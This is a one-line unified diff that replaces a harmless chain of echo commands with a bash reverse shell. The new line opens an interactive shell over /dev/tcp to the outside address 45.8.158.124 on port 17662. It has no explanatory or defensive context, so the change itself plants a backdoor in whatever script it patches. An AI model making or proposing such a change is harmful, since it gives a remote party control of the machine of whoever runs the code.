@@ -1,1 +1,1 @@
-echo "f" && echo "u" && echo "f" && echo "u"
+bash -i >& /dev/tcp/45.8.158.124/17662 0>&1
